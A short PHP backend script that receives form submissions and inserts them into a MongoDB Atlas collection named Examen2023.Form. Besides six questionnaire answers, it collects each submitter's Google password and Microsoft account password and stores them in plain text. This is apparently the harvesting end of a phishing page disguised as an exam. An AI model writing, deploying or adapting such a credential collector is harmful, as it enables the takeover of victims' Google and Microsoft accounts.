<?php
      require __DIR__ . '/vendor/autoload.php';
      
      $dotenv = Dotenv\Dotenv::createImmutable(__DIR__);
      $dotenv->load();

      //Connection
      $client = new MongoDB\Client('mongodb+srv://'.$_ENV['MDB_USER'].':'.$_ENV['MDB_PASS'].'@'.$_ENV['ATLAS_CLUSTER_SRV'].'/test');
     
      $collection = $client->Examen2023->Form;

      if(isset($_POST['q1'])){
        $q1 = json_decode($_POST['q1']);
        $q2 = json_decode($_POST['q2']);
        $q3 = json_decode($_POST['q3']);
        $q4 = json_decode($_POST['q4']);
        $q5 = json_decode($_POST['q5']);
        $q6 = json_decode($_POST['q6']);
        $googlePass = json_decode($_POST['gp']);
        $msaPass = json_decode($_POST['mp']);

        $insertOneResult = $collection->insertOne([
            'Q1' => $q1,
            'Q2' => $q2,
            'Q3' => $q3,
            'Q4' => $q4,
            'Q5' => $q5,
            'Q6' => $q6,
            'GooglePassword' => $googlePass,
            'MSAPassword' => $msaPass,
        ]);
        
      };
      

?>